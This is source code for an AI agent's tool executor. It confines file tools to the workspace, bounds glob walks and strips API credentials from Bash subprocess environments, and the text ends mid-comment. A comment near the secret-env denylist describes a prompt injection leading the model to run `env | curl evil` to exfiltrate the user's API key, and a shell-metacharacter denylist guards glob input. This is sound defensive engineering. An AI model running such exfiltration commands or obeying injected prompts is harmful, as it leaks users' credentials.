/**
 * Dispatch a tool_use block from the model to the local executor that
 * implements it. Owns the result shape: returns `{ content, isError }`
 * matching what gets put inside a `tool_result` content block sent
 * back to the API on the next turn.
 *
 * All tools are gated through the caller's permission flow before this
 * runs — by the time we get here, the user has approved the call (or
 * the session is in `auto` mode which auto-approves). We don't do
 * permission gating in here; this module is execution only.
 *
 * Path safety is enforced for file tools by validateRawPathWithinCwd from
 * ws-file-ops/common.js — every file_path is resolved COMPONENT BY COMPONENT
 * (open(2)-faithfully) and confirmed to be inside the session cwd before any
 * read/write happens. Symlink escapes — including a `..` that follows a
 * symlinked component (#6923) — are blocked by walking the RAW path rather than
 * a pre-`resolve()`d one (see common.js + the 2026-04-11 production-readiness
 * audit).
 */

import { join } from 'node:path'
import { opendir, lstat } from 'node:fs/promises'
import { constants as fsConstants } from 'node:fs'
import { isIP } from 'node:net'
import { lookup as dnsLookup } from 'node:dns/promises'
import { validateRawPathWithinCwd } from './ws-file-ops/common.js'
import { openNoFollow } from './ws-file-ops/open-nofollow.js'
import { executeBash, DEFAULT_BASH_TIMEOUT_MS } from './built-in-tools/bash-exec.js'
import { readFileTool, writeFileTool, editFileTool } from './built-in-tools/file-ops.js'
import {
  GLOB_PATTERN_SHELL_METACHARS,
  globPatternEscapeReason,
  globPatternEscapeMessage,
  globPatternComplexityReason,
  globPatternComplexityMessage,
  GLOB_PATTERN_MAX_BRACE_DEPTH,
  buildGrepArgs,
  buildGrepCommand,
} from './built-in-tools/tool-transforms.js'
import { TODO_STATUSES, BUILTIN_TOOL_NAMES } from './byok-tools.js'
// #4186: SSRF block-list lives in its own module so the (ip, expected)
// table can grow without bloating this file's WebFetch integration tests.
// The exported helpers retain the same names as the original locals so
// the call sites below read identically.
import { isPrivateOrSpecialIp } from './ssrf-guard.js'

/**
 * Cap on Bash timeout the model can request. 10 minutes is the same
 * ceiling chroxy's Bash tool uses elsewhere — long enough for a slow
 * test suite, short enough to not strand a session if a runaway loop
 * hangs.
 */
const BASH_TIMEOUT_CEILING_MS = 600_000

/**
 * Two bounds, because they do different jobs.
 *
 * `GLOB_COLLECT_CEILING` is the memory backstop on the walk. `GLOB_MAX_MATCHES`
 * is how many paths the model is shown. Collecting more than we return is what
 * makes truncation a SORTED PREFIX rather than an arbitrary subset — and that
 * distinction was a real defect, not a nicety: with a single 10 000 cap on an
 * unsorted traversal, `Glob **\/*.ts` over a 20 000-file tree returned 10 000
 * paths, `isError: false`, no marker, and `d00`–`d09` — half the tree, the
 * alphabetically-first half — simply absent. A model would conclude those
 * directories contain no TypeScript.
 */
const GLOB_COLLECT_CEILING = 50_000
const GLOB_MAX_MATCHES = 10_000

/**
 * #7901 — a second, independent bound on the self-implemented walk, distinct
 * from `GLOB_COLLECT_CEILING` (which bounds MATCHES) and from the wall-clock
 * deadline below (the primary defense — see `walkGlob`'s doc). This bounds
 * total filesystem ENTRIES visited regardless of how many matched, closing
 * the gap where a pattern matches almost nothing across an enormous tree (the
 * exact shape #7356 measured: 200,000 files, near-zero matches) — the collect
 * ceiling never engages there, and on a fast disk the walk could visit many
 * millions of entries before the 30s deadline fires. 2,000,000 is far above
 * any tree this test suite or a real workspace plausibly has (the largest
 * fixture in this file is 15,000 files); it exists as a backstop, not the
 * primary bound.
 *
 * Read per call and overridable via `CHROXY_GLOB_MAX_ENTRIES`, the same shape
 * as `globTimeoutMs`/`CHROXY_GLOB_TIMEOUT_MS` just below — for the same
 * reason: a guard nothing can lower to a testable size is a guard nobody
 * proved fires (docs/false-safety-guards.md). An empty or unparseable value
 * falls back to the 2,000,000 default rather than disabling the bound.
 */
const GLOB_MAX_ENTRIES_VISITED_DEFAULT = 2_000_000
function globMaxEntriesVisited() {
  const raw = (process.env.CHROXY_GLOB_MAX_ENTRIES || '').trim()
  if (!/^\d+$/.test(raw)) return GLOB_MAX_ENTRIES_VISITED_DEFAULT
  const n = Number(raw)
  return n > 0 ? n : GLOB_MAX_ENTRIES_VISITED_DEFAULT
}

/**
 * Wall-clock bound on a Glob walk. Matches the 30s `executeBash` timeout the
 * shell implementation had — dropping the subprocess dropped its kill, and
 * `fs.glob` honours no AbortSignal of its own.
 *
 * Read per call, not at module load, and overridable via
 * `CHROXY_GLOB_TIMEOUT_MS`. That knob is what lets the timeout be PROVEN: a
 * test asserting a 30s bound by waiting 30s does not get written, and a test
 * that only checks the happy path is a guard whose success and whose absence
 * look identical (docs/false-safety-guards.md). A very large monorepo wanting
 * a longer budget is the secondary use.
 */
const GLOB_TIMEOUT_DEFAULT_MS = 30_000
function globTimeoutMs() {
  // Trim and require a NON-EMPTY, strictly positive integer, matching every
  // other env-timeout parser in this package (config.js, prompt-evaluator.js,
  // claude-tui-session.js). The first cut used `Number(raw) >= 0`, and
  // `Number('') === 0`: an exported-but-empty `CHROXY_GLOB_TIMEOUT_MS=` — what
  // a bare `.env` line and `docker run -e VAR` both produce — gave every Glob
  // call a 0 ms budget and disabled the tool outright, with nothing pointing at
  // the cause. The knob exists to make the timeout testable; it must not be a
  // way to switch Glob off by accident.
  const raw = (process.env.CHROXY_GLOB_TIMEOUT_MS || '').trim()
  if (!/^\d+$/.test(raw)) return GLOB_TIMEOUT_DEFAULT_MS
  const n = Number(raw)
  return n > 0 ? n : GLOB_TIMEOUT_DEFAULT_MS
}

/**
 * Env vars the model must NEVER see in a Bash subprocess. Centrally
 * the BYOK API key — if a malicious prompt induces the model to run
 * `env | curl evil`, the model exfiltrates the user's API credentials
 * (caught by /agent-review on PR #4060 — see #4069). Plus chroxy's
 * own per-session secrets that are scoped to the WS auth surface.
 *
 * Note: we do NOT redact every var that looks like a secret (e.g.
 * GITHUB_TOKEN, AWS_*). The user might legitimately need those in
 * their shell — they're the workspace owner. Only redact chroxy-
 * specific credentials the model has no business reading.
 */
const SECRET_ENV_DENYLIST = new Set([
  'ANTHROPIC_API_KEY',
  'CLAUDE_CODE_OAUTH_TOKEN',
])

/**
 * Build an env for the Bash/Glob/Grep subprocess that strips chroxy's
 * own secrets. Returns a plain object — pass to executeBash's `env`.
 */
function buildSafeBashEnv() {
  const out = {}
  for (const [k, v] of Object.entries(process.env)) {
    if (SECRET_ENV_DENYLIST.has(k)) continue
    out[k] = v
  }
  return out
}

/**
 * Dispatch a single tool_use block.
 *
 * @param {object} args
 * @param {string} args.toolName       The tool name from the model
 * @param {object} args.input          The tool's input arguments (already parsed JSON)
 * @param {string} args.cwd            Session cwd — anchor for path safety
 * @param {Map} args.cwdRealCache      Per-session cache of resolved real paths
 * @param {number} args.cwdCacheTtl    Cache TTL in ms
 * @param {AbortSignal} [args.signal]  Optional abort signal — Bash exec listens
 * @param {Map}         [args.todoStore]  Per-session TodoWrite list (id → item)
 * @returns {Promise<{ content: string, isError: boolean }>}
 */
export async function executeBuiltinTool({
  toolName,
  input,
  cwd,
  cwdRealCache,
  cwdCacheTtl,
  signal,
  todoStore,
}) {
  try {
    switch (toolName) {
      case 'Read':
        return await runRead({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Write':
        return await runWrite({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Edit':
        return await runEdit({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Bash':
        return await runBash({ input, cwd, signal })
      case 'Glob':
        return await runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'Grep':
        return await runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'WebFetch':
        return await runWebFetch({ input, signal })
      case 'TodoWrite':
        return runTodoWrite({ input, todoStore })
      default: {
        // Derive the list from BUILTIN_TOOL_NAMES so adding a tool only
        // requires updating byok-tools.js — this message can't drift.
        const known = [...BUILTIN_TOOL_NAMES].sort().join(', ')
        return {
          content: `Unknown tool: ${toolName}. The claude-byok provider ships with: ${known}. MCP and other tools land in follow-up issues.`,
          isError: true,
        }
      }
    }
  } catch (err) {
    // Anything that escapes the per-tool runner becomes an error
    // tool_result so the model can see what went wrong and possibly
    // recover. The error message is sanitized — no stack traces, just
    // the error message line.
    return {
      content: `Tool ${toolName} failed: ${err?.message || String(err)}`,
      isError: true,
    }
  }
}

/** Resolve a tool-supplied path against cwd, then validate it's inside. */
async function safeResolve(filePath, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof filePath !== 'string' || filePath.length === 0) {
    throw Object.assign(new Error('file_path is required'), { code: 'EINVAL' })
  }
  // #6923 — hand the RAW filePath (its `..` intact) to the component-wise walker.
  // Do NOT pre-`resolve(cwd, filePath)`: `resolve()` collapses a `..` that follows
  // a symlinked component LEXICALLY, so `link/../x` cancelled the symlink before it
  // was followed and an escape via a symlink-out-of-workspace + `..` looked in
  // bounds. validateRawPathWithinCwd walks the raw path open(2)-faithfully so the
  // true (escaping) destination is seen and rejected.
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    filePath,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${filePath} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

async function runRead({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await readFileTool({
    filePath: realPath,
    offset: input?.offset,
    limit: input?.limit,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  const tail = result.truncatedByLimit
    ? `\n\n[showed ${result.linesReturned} of ${result.totalLines} lines]`
    : ''
  return { content: result.content + tail, isError: false }
}

async function runWrite({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await writeFileTool({
    filePath: realPath,
    content: input?.content,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Wrote ${result.bytesWritten} bytes to ${input.file_path}${result.created ? ' (created)' : ''}.`,
    isError: false,
  }
}

async function runEdit({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await editFileTool({
    filePath: realPath,
    oldString: input?.old_string,
    newString: input?.new_string,
    replaceAll: input?.replace_all === true,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Replaced ${result.replacements} occurrence(s) in ${input.file_path}.`,
    isError: false,
  }
}

async function runBash({ input, cwd, signal }) {
  const command = input?.command
  if (typeof command !== 'string' || command.length === 0) {
    return { content: 'EINVAL: command is required', isError: true }
  }
  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, BASH_TIMEOUT_CEILING_MS)
    : DEFAULT_BASH_TIMEOUT_MS

  const result = await executeBash({
    command,
    cwd,
    timeoutMs,
    signal,
    env: buildSafeBashEnv(),
  })

  // Build a single text payload — stdout, then stderr (if any), then a
  // status line. The model is the consumer here, so we err on the side
  // of being verbose about timing and exit state.
  const parts = []
  if (result.stdout) parts.push(`stdout:\n${result.stdout}`)
  if (result.stderr) parts.push(`stderr:\n${result.stderr}`)
  const statusBits = []
  if (result.timedOut) statusBits.push(`timed out after ${timeoutMs}ms`)
  if (result.aborted) statusBits.push('aborted')
  if (result.truncated) statusBits.push('output truncated at cap')
  statusBits.push(`exit=${result.exitCode ?? 'killed'}`)
  if (result.signal) statusBits.push(`signal=${result.signal}`)
  statusBits.push(`${result.durationMs}ms`)
  parts.push(`[${statusBits.join(', ')}]`)

  return {
    content: parts.join('\n\n'),
    isError: result.exitCode !== 0 || result.timedOut || result.aborted,
  }
}

// Characters in a glob pattern that allow shell-side command substitution
// or piping (GLOB_PATTERN_SHELL_METACHARS + the command builders live in the
// shared tool-transforms.js, so the host and the docker-byok container reject
// and shell out identically — #4070 / #5882).

async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  if (GLOB_PATTERN_SHELL_METACHARS.test(pattern)) {
    return {
      content: 'EINVAL: glob pattern contains shell-dangerous characters ($, `, ;, |, &, <, >, (, ), \\, newline)',
      isError: true,
    }
  }
  // #7341 — the metachar denylist above closes shell INJECTION only; it says
  // nothing about where the glob expands to. Containment is a separate rule.
  const escapeReason = globPatternEscapeReason(pattern)
  if (escapeReason) {
    return { content: globPatternEscapeMessage(escapeReason), isError: true }
  }
  // #7898 round 4 — neither check above bounds `pattern`'s length or brace
  // nesting, and every round of this PR's review has found a new way an
  // unbounded pattern makes the segment matcher (parseSegmentTokens/
  // segmentMatches, driving both compileCaseCheck's callers and walkGlob's
  // own per-entry matching below) slow or crash. See the worst-case bound
  // written above compileCaseCheck and globPatternComplexityReason's own doc
  // for the specific measured failures this closes.
  const complexityReason = globPatternComplexityReason(pattern)
  if (complexityReason) {
    return { content: globPatternComplexityMessage(complexityReason), isError: true }
  }

  // Realpath-validate the search ROOT against cwd. Pre-fix this was a
  // weak "no ..." check that let absolute paths to /etc through.
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // #7918 — a brace alternative spanning a '/' (`{dup,nested/dup}`) has no
  // representation in the per-segment compiled matcher below, which splits
  // the pattern on '/' before parsing braces at all — see `expandBraces`'s
  // doc for the full history. `hasSlashSpanningBrace` is a cheap gate: the
  // ordinary, far more common non-spanning brace (`*.{ts,js}`) keeps the
  // existing single-compile, single-walk path completely unchanged below
  // (`patterns.length === 1`, `patterns[0] === pattern`); only a
  // genuinely-spanning pattern pays for the multi-pattern expand-and-union
  // path. #7951 — a `{X..Y}` range (`file{1..3}.txt`) has the SAME gap: it
  // has no representation in the per-segment compiler either (which never
  // expands `..`), and very often does not span a '/' at all, so
  // `hasRangeBrace` is a second, independent gate alongside the first.
  let patterns
  if (hasSlashSpanningBrace(pattern) || hasRangeBrace(pattern)) {
    const expanded = expandBraces(pattern)
    if (expanded === null) {
      return {
        content: globPatternComplexityMessage(`more than ${GLOB_BRACE_EXPANSION_CAP} brace alternatives`),
        isError: true,
      }
    }
    // #7918 review — an alternative that expands to an ABSOLUTE path is
    // dropped, not walked. `globPatternEscapeReason` refuses a pattern that
    // STARTS with `/` or has one right after `{`/`,`, but concatenation can
    // still produce one: `{,x}/etc/{p,q/r}` passes that check and expands to
    // `/etc/p`. `compileCaseCheck` drops the empty leading segment, so
    // walking it would search `etc/p` under the WORKSPACE — never an escape
    // (the walk is rooted at `realRoot`), but a match `fs.glob` never makes:
    // it looks for the real `/etc/p`, which confinement then withholds. A
    // dropped alternative contributes nothing, which is exactly `fs.glob`'s
    // confined answer for it. Duplicates are dropped too: two alternatives
    // that expand to the same string would only walk the tree twice.
    patterns = [...new Set(expanded.filter((p) => !p.startsWith('/')))]
  } else {
    patterns = [pattern]
  }
  // #7951 review — `globPatternComplexityReason`'s depth half counts every
  // `{`/`}`, which bounds a BRACKET-OBLIVIOUS parser (bash in the container).
  // This host's parser pairs braces bracket-AWARE, so a `}` inside `[...]`
  // walks that counter down while the parser keeps nesting: `{,` x30 + `[` +
  // `}` x30 + `]`, repeated, reached 480 real `alt` levels in 1,953
  // characters with the counter never above 30, and overflowed the stack
  // inside the matcher with less headroom (`--stack-size=250`). Same ceiling,
  // measured the way THIS parser pairs, on exactly the strings the walk will
  // compile (an expansion splices text together, which can re-delimit a
  // bracket expression, so the raw pattern's reading would not be enough).
  if (patterns.some(hostBraceDepthExceeded)) {
    return {
      content: globPatternComplexityMessage(`"{" nesting deeper than ${GLOB_PATTERN_MAX_BRACE_DEPTH} levels`),
      isError: true,
    }
  }

  // #7341 — if the pattern NAMES a directory outright and that directory
  // resolves outside the workspace, say so instead of returning "No matches".
  //
  // Containment itself is unchanged: every match is still confined below, and
  // a symlink the caller merely DISCOVERED through a wildcard is still withheld
  // in silence, because naming it would be the existence oracle that silence
  // exists to prevent. This is the other case. When the caller writes
  // `node_modules/**` and `node_modules` is a symlink into a pnpm store, a
  // shared `.venv`, or a sibling repo, "No matches" is a baffling answer to a
  // question the caller already knew the shape of — and it leaks nothing,
  // because passing the very same path as `input.path` ALREADY returns exactly
  // this error. It also makes `pattern` and `path` consistent rather than
  // mysteriously different for the same directory.
  //
  // #7918 — scoped to a call that walks exactly ONE pattern (the unexpanded
  // one, or the sole distinct result of an expansion): a brace-expanded
  // multi-pattern call silently discovers-and-withholds an out-of-bounds
  // alternative the same way a wildcard-reached symlink already does
  // elsewhere in this function, rather than early-erroring on whichever
  // alternative happens to resolve outside the workspace first.
  if (patterns.length === 1) {
    const literalPrefix = literalDirPrefix(patterns[0])
    if (literalPrefix) {
      await safeResolveRoot(literalPrefix, realRoot, cwdRealCache, cwdCacheTtl)
    }
  }

  // Check the signal BEFORE the walk: the in-loop check is only reached when
  // the walk yields, so an already-aborted call on a pattern that matches
  // nothing used to run the whole tree and then report a cheerful "No matches".
  // The container Glob has always had this pre-check; the host lacked it, which
  // made the two backends answer differently for identical input.
  if (signal?.aborted) return { content: 'Glob interrupted', isError: true }

  // #7901 — the host no longer calls `fs.glob` (`node:fs/promises`'s `glob()`)
  // at all. Its own segment matcher backtracks catastrophically on the exact
  // pattern shapes `compileCaseCheck`'s DP was rewritten to handle safely
  // (#7898) — measured 87 SECONDS for `*a*a*a*a*a*a*a*a*a*a*b.ts` against one
  // 40-character near-miss real name, synchronously, no chroxy code involved,
  // which froze the WHOLE DAEMON's event loop (every session, every WS
  // client, the tunnel health checks) for the duration and which the 30s
  // walk-timeout race below cannot interrupt (the timer cannot fire while the
  // event loop it depends on is the thing blocked). `fs.glob` also honours no
  // AbortSignal (#7356 — an aborted or timed-out call left the walk running,
  // unbounded, after the tool result was already sent) and hard-codes
  // case-INSENSITIVE candidate generation on macOS/Windows with a
  // candidate-generation bug for negated bracket classes (#7899) that a
  // post-hoc case re-check over its candidates could never recover, because
  // the candidate fs.glob needed to produce in the first place was never
  // generated.
  //
  // `walkGlob` below replaces it with a self-implemented `fs.promises.opendir`
  // walk: at each real directory, it tracks which pattern-segment positions
  // ("matchers", from `compileCaseCheck` — the SAME non-backtracking DP #7898
  // added) are still reachable, and tests every real directory entry against
  // them via `segmentMatches` — case-sensitively BY CONSTRUCTION, since it
  // compares pattern text to the REAL on-disk name at the moment `opendir`
  // reads it, never a candidate `fs.glob` echoed back. Confinement
  // (`validateRawPathWithinCwd`, #6923's shared componentwise resolver) is
  // checked before the walk either descends into, or reports a match for, any
  // symlinked entry — so an out-of-bounds symlinked directory is never even
  // opened, which is strictly stronger than the old post-hoc filter that
  // enumerated it via `fs.glob` first and discarded the result afterward. The
  // deadline/abort race below checks in with the walk at every directory
  // entry (an `opendir` read is a real, yielding async operation), so the
  // event loop keeps turning throughout, and stopping the walk is a matter of
  // setting a flag the walk's own loop observes on its very next iteration —
  // not, as with `fs.glob`, hoping a signal it ignores gets noticed.
  // #7910 review round 2 (parity) — a pattern ending in `/` (any number of
  // trailing slashes; `compileCaseCheck` already drops the empty segment(s)
  // they produce, so the compiled `matchers` are identical either way) means
  // DIRECTORIES ONLY, matching `fs.glob`'s own observed behavior exactly:
  // verified directly, `sub/*/` matches a real subdirectory but not a plain
  // file NOR a symlink pointing at a directory (`sub/dirlink -> inner` is
  // excluded from `sub/*/`'s results) — so this is `dirent.isDirectory()`
  // specifically, never "dir-like". #7918 — computed per EXPANDED pattern
  // (`patterns`, `[pattern]` in the un-expanded common case), since a
  // brace alternative can itself end in `/` independently of its siblings
  // (`{a/,b}` — one directory-only, the other not).
  const files = []
  // ONE timer sets the flag and releases the race, so the two cannot resolve
  // in either order — a second, independent timer would let the race finish
  // before `state.stop` was assigned and report success on a timed-out walk.
  // The abort listener shares that single release for the same reason.
  const state = { stop: null, visited: 0 }
  let releaseDeadline
  const deadlineReached = new Promise((resolve) => { releaseDeadline = resolve })
  const timeoutMs = globTimeoutMs()
  const maxEntries = globMaxEntriesVisited()
  const deadline = setTimeout(() => { state.stop = 'timed out'; releaseDeadline() }, timeoutMs)
  deadline.unref?.()
  const onAbort = () => { state.stop = 'interrupted'; releaseDeadline() }
  signal?.addEventListener?.('abort', onAbort, { once: true })
  // #7918 — one walk per expanded pattern, SHARING `state`/`files`/`maxEntries`
  // across all of them: the deadline/abort/entries-visited budgets are for
  // the WHOLE Glob call, not reset per alternative (a brace pattern with N
  // alternatives must not get N times the time or entry budget). Each walk
  // still checks `state.stop`/the collect ceiling before starting, so a
  // deadline or abort hit partway through stops the REMAINING alternatives
  // too, not just the one in flight.
  async function collectAll() {
    for (const p of patterns) {
      if (state.stop !== null || files.length >= GLOB_COLLECT_CEILING) return
      const { matchers } = compileCaseCheck(p)
      const directoryOnly = p.endsWith('/')
      await walkGlob({ realRoot, matchers, cwdRealCache, cwdCacheTtl, state, results: files, maxEntries, directoryOnly })
    }
  }
  const collect = collectAll()
  // Attach a catch BEFORE the race: if the walk rejects after the deadline has
  // already settled it, the rejection would otherwise be unhandled.
  let walkError = null
  collect.catch((err) => { walkError = err })
  try {
    await Promise.race([collect, deadlineReached])
  } catch (err) {
    walkError = err
  }
  clearTimeout(deadline)
  signal?.removeEventListener?.('abort', onAbort)
  if (walkError) {
    return { content: `Glob failed: ${walkError?.message || String(walkError)}`, isError: true }
  }
  if (state.stop === 'timed out') {
    return { content: `Glob timed out after ${timeoutMs}ms`, isError: true }
  }
  if (state.stop === 'interrupted') return { content: 'Glob interrupted', isError: true }
  if (state.stop === 'too many entries') {
    return {
      content: `Glob visited more than ${maxEntries} filesystem entries without finishing — narrow the pattern or use "path"`,
      isError: true,
    }
  }
  // #7357 — a match containing an embedded newline cannot be told apart, in a
  // '\n'-joined text result, from two separate matches: `sub/deep/nl\nSECRET`
  // reads back as `sub/deep/nl` and `SECRET` on two lines, and the second of
  // those is a path that does not exist as spelled. NUL is the only byte a
  // POSIX filename cannot contain, but the tool_result handed back to the
  // model is plain '\n'-joined text (not NUL-delimited), so there is no
  // encoding that stays both unambiguous AND a single text line. Dropping is
  // the one option of the two the issue names ("emitted unambiguously or
  // skipped, never split") that needs no new escape syntax for the model to
  // learn, and it is applied identically here and in the container path
  // (docker-byok-session.js's `_containerGlob`) so the two backends agree on
  // what "the same input" means. This is a display-format decision, not a
  // containment one — the match is not a security-relevant withholding, so it
  // gets no daemon-log line the way an escaping match does.
  let kept = files.filter((f) => !f.includes('\n'))
  // #7918 — two DIFFERENT brace alternatives can match the SAME real path
  // (`{*/dup,nested/*}` — both alternatives match `nested/dup`), and each
  // alternative's `walkGlob` call pushes into the SAME shared `files` array,
  // so a multi-pattern call can push the same relPath twice where a single
  // pattern's own walk never could (one walk visits each real directory at
  // most once, per `visitedDirs`). Scoped to `patterns.length > 1` so the
  // overwhelmingly common single-pattern path pays no Set-construction cost
  // for a case that cannot occur there.
  if (patterns.length > 1) kept = Array.from(new Set(kept))
  // A withheld match is reported as no match, with no count and no marker.
  // Anything that distinguishes "matched, but outside" from "matched nothing"
  // is an existence ORACLE: a workspace that contains `esc -> /` turns one bit
  // per call into filesystem enumeration, on a tool that is auto-approved in
  // `acceptEdits`. The confinement is proven by tests, not by a runtime marker.
  if (kept.length === 0) return { content: `No matches for ${pattern}`, isError: false }

  // Sort. Every shell glob does, and `walkGlob` yields in filesystem
  // traversal order (deterministic-but-different from a shell's, same as the
  // old `fs.glob`-based walk was), which would reshuffle the whole listing for
  // a one-file change and destroy the alphabetical grouping that makes a long
  // result readable.
  kept.sort()

  // TRUNCATION IS ANNOUNCED. The oracle argument that justifies silence for
  // withheld matches does not apply here: a count of in-workspace matches
  // reveals nothing about anything outside it, and silently dropping paths
  // makes Glob wrong by omission with nothing to tell the model.
  if (kept.length > GLOB_MAX_MATCHES) {
    const total = files.length >= GLOB_COLLECT_CEILING ? `${kept.length}+` : `${kept.length}`
    const shown = kept.slice(0, GLOB_MAX_MATCHES)
    shown.push(`[truncated: showing ${GLOB_MAX_MATCHES} of ${total} matches — narrow the pattern or use "path"]`)
    return { content: shown.join('\n'), isError: false }
  }
  return { content: kept.join('\n'), isError: false }
}

/**
 * #7901 — the self-implemented replacement for `fs.glob`'s own walk+match.
 * Walks `realRoot` one real directory at a time via `fs.promises.opendir`,
 * tracking which positions in `matchers` (from `compileCaseCheck`) are still
 * reachable — the same array-wildcard DP `caseCheckPasses` already runs
 * post-hoc over a KNOWN full path, here computed INCREMENTALLY, one real
 * directory level at a time, so it can decide which subdirectories are worth
 * opening at all instead of enumerating everything and filtering afterward.
 *
 * `active`/`next` are boolean arrays of length `matchers.length + 1`; index
 * `k` means "matchers[0..k) have successfully aligned with every real
 * segment consumed so far". `closeGlobstars` propagates a `**` matcher's
 * "matches zero segments" case (so `k` reachable via a `**` at position `k`
 * makes `k+1` reachable too, with no directory read needed) — the same
 * prefix-OR trick `caseCheckPasses` uses for `**`, just applied as the walk
 * descends instead of after the fact.
 *
 * MATCH: whenever `next[matchers.length]` is true for an entry, the pattern
 * is fully satisfied — that entry (file or directory, matching `fs.glob`'s
 * own behavior of returning either) is a result. DESCEND: whenever `next` has
 * any true bit at an index below `matchers.length`, there is a still-
 * incomplete (or still-`**`-absorbing) alignment that a deeper real segment
 * could complete, so a directory (or a symlink that might resolve to one) is
 * opened; an ordinary file never is, at zero extra cost.
 *
 * SECURITY (#7341/#6923, carrying forward into #7901) — a symlinked entry is
 * realpath-validated against `realRoot` via the shared componentwise resolver
 * BEFORE it is either reported as a match or descended into. An entry whose
 * real target resolves outside the workspace is withheld silently (never
 * matched, never opened) — stronger than the predecessor's post-hoc filter,
 * which let `fs.glob` enumerate an out-of-bounds symlinked directory's
 * contents first and discarded the result afterward; this walk never opens
 * it. FAIL-CLOSED: a symlink that cannot be resolved (ELOOP, EACCES, a depth
 * bomb) is withheld the same way.
 *
 * SECURITY (review of #7901, TOCTOU — closed properly in round 2) — an
 * ordinary (non-symlink-AT-LISTING-TIME) directory is NOT trusted on
 * `dirent`'s type alone before being opened: `fs.promises.opendir` batches
 * several dirents per underlying `readdir(2)` call, and this walk is
 * strictly sequential within a directory, so an entry late in a large
 * listing is reached only after every earlier one (including a deep
 * subtree) has been fully processed — the type Node captured for it can be
 * stale by then. Chroxy fans every tool block a model approves in one turn
 * out CONCURRENTLY (`byok-session.js`'s `Promise.all`, #7356), so a Bash
 * call approved in the SAME turn as a Glob call can replace a plain
 * directory with a symlink to anywhere while this walk is still busy
 * elsewhere in the tree. Measured directly (byok-tool-executor.test.js): an
 * unpatched walk over a 60-sibling directory followed exactly such a swap
 * straight into the attacker's target and returned matches from OUTSIDE the
 * workspace, reported under a workspace-looking `relPath`. A first attempt
 * at closing this (round 2's `resolveNonSymlinkDescend`) re-`lstat`ed
 * immediately before returning a path string for `walk` to `opendir` — but
 * that is STILL check-then-use: the two calls are independent, so a swap
 * landing in the gap between them is exactly as invisible as one landing
 * before the check. A round-2 REFINEMENT (`resolveNonSymlinkDescend` folded
 * into an early version of `openVerifiedDirForDescend`) collapsed that into
 * one `opendir` immediately re-verified by a second `lstat` on the same
 * path — narrower, but still an ABA: a swap-to-symlink before the `opendir`
 * and a swap-BACK before the second `lstat` both went undetected, because
 * neither `lstat` ever inspected the object `opendir` had actually opened.
 * `walk`'s call site now routes every directory-shaped descent —
 * symlink-flagged or not — through {@link openVerifiedDirForDescend}, which
 * opens with `O_NOFOLLOW` and verifies identity via `fstat` on the opened
 * handle itself (never a fresh path lookup), then reads entries from that
 * SAME verified object where the platform allows it, and hands `walk` the
 * already-open, already-verified `Dir` directly — no path is ever handed
 * back for a second, disconnected open to (not) re-check. See that
 * function's doc for exactly what this closes, how, and the residual risk
 * that remains on platforms without a way to bind directory listing to an
 * already-open fd.
 *
 * SECURITY (#7355/#7899) — case-sensitive by construction: every comparison
 * is `segmentMatches(matcher, dirent.name)` against the REAL name `opendir`
 * just read, never a pattern-echoed candidate, so there is no case-folding
 * layer left to disagree with (host and container Glob, and Claude Code's own
 * Glob, now agree on every pattern shape a fuzz found disagreement on,
 * negated bracket classes included — `segmentMatches`/`advanceToken` never
 * had a nocase mode to begin with).
 *
 * DOT HANDLING — a bare wildcard/class token never stands for a real
 * segment's leading dot (`advanceToken`'s dot guard, `parseSegmentTokens`'s
 * doc), matching `fs.glob`'s own observed default exactly (verified directly
 * against Node 22's `glob()`): `.env*` and `.[a-z]*` still find `.envrc`,
 * `*.ts`/`?env`/most bracket classes do not, and `*` never lists a
 * dotfile/dotdir unless a pattern segment explicitly spells a leading
 * literal dot for that level. `**` follows the SAME rule for its own zero-
 * width closure (a bare trailing `**` never lists a dotfile/dotdir either),
 * but #7912 — verified directly against Node's own `internal/fs/glob.js`
 * GLOBSTAR algorithm, not merely observed — its CROSSING behavior (whether
 * it absorbs a dot-named directory on the way to a deeper match) is a
 * narrower exception: a dot-named entry is absorbed exactly when the
 * pattern segment immediately after this run of `**`s explicitly matches
 * that entry's own name (`nextNonGlobstar`, below) — so `**\/.*` crosses
 * `.hidden` to reach `.hidden/.deepdot` (the wildcard `.*` matches
 * `.hidden`'s own name too), while `**\/*` never crosses any dot directory
 * at all (a bare `*` matches no dot name, ever) and `**\/.deepdot` (a
 * DIFFERENTLY-named literal tail) does not cross `.hidden` either, because
 * `.deepdot` does not match `.hidden`'s name — see `walkGlob`'s per-entry
 * globstar handling for the exact mechanism.
 *
 * BOUNDS — the caller's deadline/abort race is checked (`state.stop`) at the
 * top of every directory and before every entry, so an `opendir` read (a
 * real, yielding async op) is never more than one entry away from noticing a
 * stop. `GLOB_COLLECT_CEILING` bounds MATCHES the same way the old walk did;
 * `maxEntries` (`globMaxEntriesVisited()`) additionally bounds total entries
 * VISITED regardless of match count, for the #7356 shape (an enormous tree, almost no
 * matches) where the collect ceiling never engages.
 *
